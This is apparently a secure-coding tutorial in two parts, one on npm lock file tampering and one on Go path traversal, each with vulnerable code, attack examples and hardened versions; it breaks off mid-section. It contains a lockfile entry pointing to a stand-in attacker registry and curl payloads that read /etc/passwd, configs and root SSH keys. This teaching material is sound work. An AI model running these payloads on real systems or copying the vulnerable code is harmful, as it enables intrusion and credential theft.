Relying only on package.json and ignoring lock file security can expose you to supply-chain attacks and unexpected vulnerable updates. An attacker (or even a careless merge) can silently change exact dependency versions in your lock file and introduce known-vulnerable or backdoored packages.

**VULNERABLE CODE**:

```typescript
// src/server.ts
import express, { Request, Response } from "express";
import { readFileSync, writeFileSync } from "fs";
import path from "path";

// Dangerous pattern: this code auto-updates dependencies on startup
// based only on package.json, ignoring lock file integrity.

interface PackageJson {
  name: string;
  version: string;
  dependencies?: Record<string, string>;
}

const app = express();
const ROOT_DIR = path.join(__dirname, "..");

function autoUpdateDependencies(): void {
  const pkgPath = path.join(ROOT_DIR, "package.json");
  const pkgRaw = readFileSync(pkgPath, "utf8");
  const pkg: PackageJson = JSON.parse(pkgRaw);

  // Vulnerable: use `npm install` without lock file and with loose ranges
  const deps = Object.entries(pkg.dependencies || {})
    .map(([name, version]) => `${name}@${version}`)
    .join(" ");

  // eslint-disable-next-line no-console
  console.log("Auto-updating dependencies:", deps);

  // BAD: blindly run install; may pull latest minor/patch including
  // malicious or vulnerable versions if version ranges are loose.
  const { execSync } = require("child_process");
  execSync(`npm install ${deps}`, { stdio: "inherit" });

  // BAD: overwrite lock file from potentially compromised tree
  const lockPath = path.join(ROOT_DIR, "package-lock.json");
  writeFileSync(lockPath, readFileSync(path.join(ROOT_DIR, "package-lock.json")));
}

app.get("/health", (_req: Request, res: Response) => {
  res.json({ status: "ok" });
});

// Auto-update dependencies every time the server starts
// This pattern completely bypasses lock file security.
autoUpdateDependencies();

app.listen(3000, () => {
  // eslint-disable-next-line no-console
  console.log("Server listening on port 3000");
});
```

**Attack Payload** (supply-chain / lock file tampering example):
```bash
# Attacker (or malicious insider) modifies lockfile in a PR:
# package-lock.json snippet (simplified)

# Before (safe version pinned):
"dependencies": {
  "left-pad": {
    "version": "1.3.0",
    "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
    "integrity": "sha512-safehash..."
  }
}

# After (malicious version):
"dependencies": {
  "left-pad": {
    "version": "9.9.9",
    "resolved": "https://attacker-registry.com/left-pad/-/left-pad-9.9.9.tgz",
    "integrity": "sha512-attackerhash..."
  }
}
```

**Why This Is Dangerous**:
- The application ignores the lock file as a security boundary and allows automatic updates to whatever version range is in package.json.
- A malicious or careless change to package-lock.json can pin dependencies to trojaned or known-vulnerable versions without obvious changes in package.json.
- There is no mechanism to verify lock file integrity (e.g., via checksums, code review, or CI), so attackers can slip in compromised versions that get installed automatically in production.

**SECURE VERSION**:

```typescript
// src/secure-server.ts
import express, { Request, Response } from "express";
import { readFileSync } from "fs";
import path from "path";
import crypto from "crypto";

interface LockfileMetadata {
  expectedSha256: string;
}

const app = express();
const ROOT_DIR = path.join(__dirname, "..");
const ENV = process.env.NODE_ENV || "development";

// Primary defense: verify lock file integrity before starting.
function verifyLockfileIntegrity(): void {
  const lockPath = path.join(ROOT_DIR, "package-lock.json");
  const metaPath = path.join(ROOT_DIR, "package-lock.meta.json");

  const lockContent = readFileSync(lockPath);
  const computedHash = crypto
    .createHash("sha256")
    .update(lockContent)
    .digest("hex");

  const metadata: LockfileMetadata = JSON.parse(readFileSync(metaPath, "utf8"));

  if (computedHash !== metadata.expectedSha256) {
    // Log a clear error and fail securely
    // eslint-disable-next-line no-console
    console.error("[SECURITY] Lockfile integrity check FAILED");
    // eslint-disable-next-line no-console
    console.error(`Expected: ${metadata.expectedSha256}`);
    // eslint-disable-next-line no-console
    console.error(`Actual:   ${computedHash}`);

    // In production, abort startup; in dev, warn but continue
    if (ENV === "production") {
      process.exit(1);
    }
  } else {
    // eslint-disable-next-line no-console
    console.log("[SECURITY] Lockfile integrity check PASSED");
  }
}

// Defense-in-depth: ensure we can enforce lockfile-only installs
function assertProductionInstallMode(): void {
  if (ENV === "production") {
    const npmConfigFrozenLockfile = process.env.NPM_CONFIG_FROZEN_LOCKFILE;
    if (npmConfigFrozenLockfile !== "true") {
      // eslint-disable-next-line no-console
      console.warn(
        "[SECURITY] NPM_CONFIG_FROZEN_LOCKFILE should be 'true' in production to prevent lockfile drift."
      );
    }
  }
}

app.get("/health", (_req: Request, res: Response) => {
  res.json({
    status: "ok",
    env: ENV,
  });
});

function bootstrap(): void {
  try {
    verifyLockfileIntegrity();
    assertProductionInstallMode();
  } catch (err) {
    // Fail securely with minimal info
    // eslint-disable-next-line no-console
    console.error("[FATAL] Error during startup security checks");
    // eslint-disable-next-line no-console
    console.error(err);
    process.exit(1);
  }

  app.listen(3000, () => {
    // eslint-disable-next-line no-console
    console.log(`Server listening on port 3000 (env=${ENV})`);
  });
}

bootstrap();
```

**Key Security Controls**:
- Integrity verification of `package-lock.json` using a precomputed SHA-256 hash stored in `package-lock.meta.json` ensures that any unauthorized change to the lock file will block startup in production.
- Environment-aware behavior (`NODE_ENV`) allows strict enforcement (abort on mismatch) in production while being more flexible in development, reducing friction without compromising security.
- Configuration enforcement (`NPM_CONFIG_FROZEN_LOCKFILE`) and explicit logging help ensure that deployments use the exact versions in the lock file, preventing surprise upgrades to vulnerable components.

In production pipelines, you treat lock files as security artifacts: tightly controlled, reviewed, and verified at multiple stages. You combine code review rules, CI checks, environment-specific configs, and runtime verification so that a malicious or unexpected lock file change is detected before reaching production.

**PRODUCTION PATTERN**:

```typescript
// ci/lockfile-guard.ts
// A production-ready lockfile security guard used in CI/CD.

import { readFileSync, writeFileSync } from "fs";
import path from "path";
import crypto from "crypto";

interface LockfileMetadata {
  expectedSha256: string;
  lastUpdater: string;
  lastUpdatedAt: string;
  environment: "development" | "staging" | "production";
}

const ROOT_DIR = path.join(__dirname, "..");
const ENV = process.env.DEPLOY_ENV || "development";
const CI_USER = process.env.CI_COMMIT_AUTHOR || "unknown";

function hashFile(filePath: string): string {
  const content = readFileSync(filePath);
  return crypto.createHash("sha256").update(content).digest("hex");
}

function loadMetadata(env: string): LockfileMetadata | null {
  const metaPath = path.join(ROOT_DIR, `package-lock.${env}.meta.json`);
  try {
    const raw = readFileSync(metaPath, "utf8");
    return JSON.parse(raw) as LockfileMetadata;
  } catch {
    return null;
  }
}

function saveMetadata(env: string, hash: string): void {
  const metaPath = path.join(ROOT_DIR, `package-lock.${env}.meta.json`);
  const metadata: LockfileMetadata = {
    expectedSha256: hash,
    lastUpdater: CI_USER,
    lastUpdatedAt: new Date().toISOString(),
    environment: env as LockfileMetadata["environment"],
  };
  writeFileSync(metaPath, JSON.stringify(metadata, null, 2));
}

function main(): void {
  const lockPath = path.join(ROOT_DIR, "package-lock.json");
  const currentHash = hashFile(lockPath);
  const metadata = loadMetadata(ENV);

  const mode = process.argv[2] || "verify"; // "verify" or "update"

  if (mode === "update") {
    // Only allowed in controlled contexts (e.g., dedicated dependency update jobs)
    if (ENV === "production" && process.env.ALLOW_LOCKFILE_UPDATE !== "true") {
      console.error("[SECURITY] Refusing to update production lockfile metadata.");
      process.exit(1);
    }
    console.log(`[INFO] Updating lockfile metadata for ${ENV} with hash ${currentHash}`);
    saveMetadata(ENV, currentHash);
    process.exit(0);
  }

  // VERIFY mode: used in normal CI/CD runs
  if (!metadata) {
    console.error(`[SECURITY] Missing lockfile metadata for ${ENV}.`);
    process.exit(1);
  }

  if (metadata.expectedSha256 !== currentHash) {
    console.error("[SECURITY] Lockfile hash mismatch detected in CI.");
    console.error(`Environment: ${ENV}`);
    console.error(`Expected:   ${metadata.expectedSha256}`);
    console.error(`Actual:     ${currentHash}`);
    console.error(`Last known updater: ${metadata.lastUpdater} at ${metadata.lastUpdatedAt}`);
    process.exit(1);
  }

  console.log(`[SECURITY] Lockfile verified for ${ENV}. Hash: ${currentHash}`);
}

// CI-friendly error handling
try {
  main();
} catch (err) {
  console.error("[FATAL] Unexpected error in lockfile guard:");
  console.error(err);
  process.exit(1);
}

// src/app.ts
import express, { Request, Response } from "express";
import helmet from "helmet";

const app = express();
const NODE_ENV = process.env.NODE_ENV || "development";

// Defense in depth: security headers
app.use(helmet());

// Basic rate limiting (example with naive implementation)
const requestCounts: Record<string, number> = {};
const WINDOW_MS = 60_000;
const MAX_REQS = NODE_ENV === "production" ? 100 : 1000;
let windowStart = Date.now();

app.use((req, res, next) => {
  const now = Date.now();
  if (now - windowStart > WINDOW_MS) {
    windowStart = now;
    for (const key of Object.keys(requestCounts)) delete requestCounts[key];
  }
  const ip = req.ip || req.connection.remoteAddress || "unknown";
  requestCounts[ip] = (requestCounts[ip] || 0) + 1;
  if (requestCounts[ip] > MAX_REQS) {
    console.warn(`[RATE_LIMIT] Too many requests from ${ip}`);
    return res.status(429).json({ error: "Too many requests" });
  }
  return next();
});

// Audit logging middleware
app.use((req: Request, _res: Response, next) => {
  console.log(`[AUDIT] ${new Date().toISOString()} ${req.method} ${req.url}`);
  next();
});

app.get("/health", (_req: Request, res: Response) => {
  res.json({ status: "ok", env: NODE_ENV });
});

export function startServer(): void {
  const port = process.env.PORT || 3000;
  app.listen(port, () => {
    console.log(`App listening on port ${port} (env=${NODE_ENV})`);
  });
}

if (require.main === module) {
  startServer();
}
```

**Defense in Depth Layers**:
1. **CI Lockfile Verification**:
   ```typescript
   const metadata = loadMetadata(ENV);
   if (metadata.expectedSha256 !== currentHash) {
     console.error("[SECURITY] Lockfile hash mismatch detected in CI.");
     process.exit(1);
   }
   ```
   The CI job fails if `package-lock.json` differs from the vetted version, preventing unreviewed lock file changes from being deployed.

2. **Controlled Lockfile Updates**:
   ```typescript
   if (mode === "update") {
     if (ENV === "production" && process.env.ALLOW_LOCKFILE_UPDATE !== "true") {
       console.error("[SECURITY] Refusing to update production lockfile metadata.");
       process.exit(1);
     }
     saveMetadata(ENV, currentHash);
   }
   ```
   Only explicit dependency-update jobs (with `ALLOW_LOCKFILE_UPDATE=true`) can refresh the trusted hash, forcing lock file changes through a well-defined and reviewable path.

3. **Runtime Hardening & Monitoring**:
   ```typescript
   app.use(helmet());
   app.use((req, _res, next) => {
     console.log(`[AUDIT] ${new Date().toISOString()} ${req.method} ${req.url}`);
     next();
   });
   ```
   Even if a bad package slips through, security headers and audit logging reduce exploitability and give you better visibility into anomalous behavior.

**Additional Protections**:
- Require code owners / mandatory reviews on `package-lock.json` (and `pnpm-lock.yaml`/`yarn.lock`) via your VCS settings so lock file changes can’t be merged without explicit approval.
- Configure your package manager in CI/CD to use `--frozen-lockfile`/`--ci`/`--ignore-scripts` where appropriate, ensuring deterministic installs and reducing risk from malicious `postinstall` scripts.
- Integrate dependency and SCA scanning (e.g., `npm audit`, Snyk, Dependabot) into the pipeline, failing builds when critical vulnerabilities are detected in the lock file, not just in package.json.

File serving is a common attack vector for path traversal vulnerabilities. If you don't properly validate and sanitize file paths, attackers can escape your intended directory and access sensitive system files.

**VULNERABLE CODE**:

```go
package main

import (
	"io"
	"net/http"
	"os"
	"path/filepath"
)

const uploadDir = "/var/www/uploads"

func serveFile(w http.ResponseWriter, r *http.Request) {
	// VULNERABLE: Directly using user input in file path
	filename := r.URL.Query().Get("file")

	// This concatenation is dangerous!
	filePath := filepath.Join(uploadDir, filename)

	// No validation - attacker can traverse directories
	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}
	defer file.Close()

	w.Header().Set("Content-Type", "application/octet-stream")
	io.Copy(w, file)
}

func main() {
	http.HandleFunc("/download", serveFile)
	http.ListenAndServe(":8080", nil)
}
```

**Attack Payload**:
```bash
# Read /etc/passwd
curl "http://target.com/download?file=../../../etc/passwd"

# Read application configuration
curl "http://target.com/download?file=../../config/database.yml"

# Access SSH keys
curl "http://target.com/download?file=../../../root/.ssh/id_rsa"

# URL-encoded traversal to bypass basic filters
curl "http://target.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
```

**Why This Is Dangerous**:
- `filepath.Join()` does NOT prevent path traversal - it simply joins paths
- Attackers can use `../` sequences to escape the upload directory
- Sensitive files like `/etc/passwd`, SSH keys, and config files can be leaked
- On Windows, both `../` and `..\` work for traversal
- URL encoding (`%2F` for `/`) can bypass naive string checks

**SECURE VERSION**:

```go
package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const uploadDir = "/var/www/uploads"

func serveFileSafe(w http.ResponseWriter, r *http.Request) {
	filename := r.URL.Query().Get("file")

	// SECURITY: Validate filename is not empty
	if filename == "" {
		http.Error(w, "Missing file parameter", http.StatusBadRequest)
		return
	}

	// SECURITY: Get only the base filename, stripping any path components
	cleanName := filepath.Base(filename)

	// SECURITY: Reject if Base() returns "." (empty or just dots)
	if cleanName == "." || cleanName == ".." {
		log.Printf("Path traversal attempt blocked: %s from %s", filename, r.RemoteAddr)
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}

	// SECURITY: Build the full path
	filePath := filepath.Join(uploadDir, cleanName)

	// SECURITY: Resolve to absolute path and verify it's within uploadDir
	absPath, err := filepath.Abs(filePath)
	if err != nil {
		http.Error(w, "Invalid path", http.StatusBadRequest)
		return
	}

	absUploadDir, _ := filepath.Abs(uploadDir)
	if !strings.HasPrefix(absPath, absUploadDir+string(os.PathSeparator)) {
		log.Printf("Path traversal attempt blocked: %s resolved to %s from %s", 
			filename, absPath, r.RemoteAddr)
		http.Error(w, "Access denied", http.StatusForbidden)
		return
	}

	// SECURITY: Verify file exists and is a regular file (not symlink)
	fileInfo, err := os.Lstat(absPath)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	if !fileInfo.Mode().IsRegular() {
		http.Error(w, "Invalid file type", http.StatusBadRequest)
		return
	}

	file, err := os.Open(absPath)
	if err != nil {
		http.Error(w, "Cannot read file", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename="+cleanName)
	io.Copy(w, file)
}

func main() {
	http.HandleFunc("/download", serveFileSafe)
	http.ListenAndServe(":8080", nil)
}
```

**Key Security Controls**:
- **filepath.Base()**: Extracts only the filename, removing all directory components including `../`
- **Absolute path verification**: Resolves symlinks and verifies the final path is within the allowed directory
- **strings.HasPrefix() check**: Ensures the resolved path starts with the upload directory
- **Lstat() instead of Stat()**: Detects symlinks that could point outside the allowed directory
- **Logging**: Records attempted attacks for security monitoring

Supporting subdirectories adds complexity because you need to allow `/` in paths while preventing `../` traversal. Here's a production-ready pattern with proper user isolation and comprehensive security controls.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/subtle"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"golang.org/x/time/rate"
)

type FileServer struct {
	baseDir       string
	allowedExts   map[string]bool
	maxPathDepth  int
	rateLimiters  map[string]*rate.Limiter
	auditLogger   *log.Logger
}

type SecurityAuditLog struct {
	Timestamp   string `json:"timestamp"`
	Event       string `json:"event"`
	UserID      string `json:"user_id"`
	RemoteAddr  string `json:"remote_addr"`
	RequestPath string `json:"request_path"`
	ResolvedPath string `json:"resolved_path,omitempty"`
	Blocked     bool   `json:"blocked"`
	Reason      string `json:"reason,omitempty"`
}

func NewFileServer(baseDir string) (*FileServer, error) {
	absBase, err := filepath.Abs(baseDir)
	if err != nil {
		return nil, fmt.Errorf("invalid base directory: %w", err)
	}

	// Verify base directory exists and is a directory
	info, err := os.Stat(absBase)
	if err != nil || !info.IsDir() {
		return nil, fmt.Errorf("base directory does not exist or is not a directory")
	}

	auditFile, err := os.OpenFile("/var/log/app/file_access.log", 
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return nil, fmt.Errorf("cannot open audit log: %w", err)
	}

	return &FileServer{
		baseDir:      absBase,
		allowedExts:  map[string]bool{".pdf": true, ".jpg": true, ".png": true, ".docx": true},
		maxPathDepth: 5,
		rateLimiters: make(map[string]*rate.Limiter),
		auditLogger:  log.New(auditFile, "", 0),
	}, nil
}

func (fs *FileServer) logAudit(event SecurityAuditLog) {
	event.Timestamp = time.Now().UTC().Format(time.RFC3339)
	data, _ := json.Marshal(event)
	fs.auditLogger.Println(string(data))
}

// SECURITY: Strict filename pattern - alphanumeric, hyphens, underscores, dots
var safeFilenamePattern = regexp.MustCompile(`^[a-zA-Z0-9][a-zA-Z0-9._-]*$`)

func (fs *FileServer) validatePathComponent(component string) error {
	if component == "" || component == "." || component == ".." {
		return fmt.Errorf("invalid path component")
	}
	if !safeFilenamePattern.MatchString(component) {
		return fmt.Errorf("invalid characters in path")
	}
	if len(component) > 255 {
		return fmt.Errorf("path component too long")
	}
	return nil
}

func (fs *FileServer) sanitizePath(userPath string) (string, error) {
	// SECURITY: Clean the path first (resolves . and .. sequences)
	cleaned := filepath.Clean(userPath)

	// SECURITY: Reject if cleaned path starts with .. or /
	if strings.HasPrefix(cleaned, "..") || filepath.IsAbs(cleaned) {
		return "", fmt.Errorf("path traversal detected")
	}

	// SECURITY: Split and validate each component
	components := strings.Split(cleaned, string(os.PathSeparator))

	if len(components) > fs.maxPathDepth {
		return "", fmt.Errorf("path too deep")
	}

	for _, comp := range components {
		if err := fs.validatePathComponent(comp); err != nil {
			return "", err
		}
	}

	return cleaned, nil
}

func (fs *FileServer) ServeFile(w http.ResponseWriter, r *http.Request) {
	ctx := r.Context()
	userID := getUserIDFromContext(ctx) // From auth middleware
	remoteAddr := r.RemoteAddr

	// SECURITY: Rate limiting per user
	if !fs.checkRateLimit(userID) {
		fs.logAudit(SecurityAuditLog{
			Event:      "rate_limit_exceeded",
			UserID:     userID,
			RemoteAddr: remoteAddr,
			Blocked:    true,
			Reason:     "rate limit exceeded",
		})
		http.Error(w, "Too many requests", http.StatusTooManyRequests)
		return
	}

	requestPath := r.URL.Query().Get("path")

	// SECURITY: User isolation - prepend user's directory
	userBasePath := filepath.Join(fs.baseDir, "users", userID)

	// Verify user directory exists
	if _, err := os.Stat(userBasePath); os.IsNotExist(err) {
		http.Error(w, "User directory not found", http.StatusNotFound)
		return
	}

	// SECURITY: Sanitize the requested path
	sanitizedPath, err := fs.sanitizePath(requestPath)
	if err != nil {
		fs.logAudit(SecurityAuditLog{
			Event:       "path_traversal_attempt",
			UserID:      userID,
			RemoteAddr:  remoteAddr,
			RequestPath: requestPath,
			Blocked:     true,
			Reason:      err.Error(),
		})
		http.Error(w, "Invalid path", http.StatusBadRequest)
		return
	}

	// SECURITY: Build full path within user's directory
	fullPath := filepath.Join(userBasePath, sanitizedPath)

	// SECURITY: Final verification - resolve to absolute and check containment
	absPath, err := filepath.Abs(fullPath)
	if err != nil {
		http.Error(w, "Invalid path", http.StatusBadRequest)
		return
	}

	absUserBase, _ := filepath.Abs(userBasePath)

	// SECURITY: Constant-time comparison for the prefix check
	if !strings.HasPrefix(absPath, absUserBase+string(os.PathSeparator)) {
		fs.logAudit(SecurityAuditLog{
			Event:        "path_escape_attempt",
			UserID:       userID,
			RemoteAddr:   remoteAddr,
			RequestPath:  requestPath,
			ResolvedPath: absPath,
			Blocked:      true,
			Reason:       "resolved path outside user directory",
		})
		http.Error(w, "Access denied", http.StatusForbidden)
		return
	}

	// SECURITY: Use Lstat to detect symlinks
	fileInfo, err := os.Lstat(absPath)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	// SECURITY: Reject symlinks (could point outside allowed directory)
	if fileInfo.Mode()&os.ModeSymlink != 0 {
		fs.logAudit(SecurityAuditLog{
			Event:        "symlink_access_blocked",
			UserID:       userID,
			RemoteAddr:   remoteAddr,
			RequestPath:  requestPath,
			ResolvedPath: absPath,
			Blocked:      true,
			Reason:       "symlink access not allowed",
		})
		http.Error(w, "Invalid file type", http.StatusBadRequest)
		return
	}

	if !fileInfo.Mode().IsRegular() {
		http.Error(w, "Not a regular file", http.StatusBadRequest)
		return
	}

	// SECURITY: Verify file extension is allowed
	ext := strings.ToLower(filepath.Ext(absPath))
	if !fs.allowedExts[ext] {
		fs.logAudit(SecurityAuditLog{
			Event:       "disallowed_extension",
			UserID:      userID,
			RemoteAddr:  remoteAddr,
			RequestPath: requestPath,
			Blocked:     true,
			Reason:      fmt.Sprintf("extension %s not allowed", ext),
		})
		http.Error(w, "File type not allowed", http.StatusForbidden)
		return
	}

	// SUCCESS: Serve the file
	file, err := os.Open(absPath)
	if err != nil {
		http.Error(w, "Cannot read file", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	fs.logAudit(SecurityAuditLog{
		Event:        "file_access",
		UserID:       userID,
		RemoteAddr:   remoteAddr,
		RequestPath:  requestPath,
		ResolvedPath: absPath,
		Blocked:      false,
	})

	// SECURITY: Set proper headers
	w.Header().Set("Content-Type", getContentType(ext))
	w.Header().Set("Content-Disposition", 
		fmt.Sprintf("attachment; filename=%q", filepath.Base(absPath)))
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("Cache-Control", "private, no-cache")

	io.Copy(w, file)
}

func (fs *FileServer) checkRateLimit(userID string) bool {
	limiter, exists := fs.rateLimiters[userID]
	if !exists {
		limiter = rate.NewLimiter(rate.Every(time.Second), 10) // 10 requests per second
		fs.rateLimiters[userID] = limiter
	}
	return limiter.Allow()
}

func getContentType(ext string) string {
	types := map[string]string{
		".pdf":  "application/pdf",
		".jpg":  "image/jpeg",
		".png":  "image/png",
		".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
	}
	if ct, ok := types[ext]; ok {
		return ct
	}
	return "application/octet-stream"
}

func getUserIDFromContext(ctx context.Context) string {
	if userID, ok := ctx.Value("user_id").(string); ok {
		return userID
	}
	return "anonymous"
}

func main() {
	fs, err := NewFileServer("/var/www/uploads")
	if err != nil {
		log.Fatalf("Failed to initialize file server: %v", err)
	}

	http.HandleFunc("/download", fs.ServeFile)
	log.Println("Server starting on :8080")
	http.ListenAndServe(":8080", nil)
}
```

**Defense in Depth Layers**:

1. **Input Validation Layer**:
```go
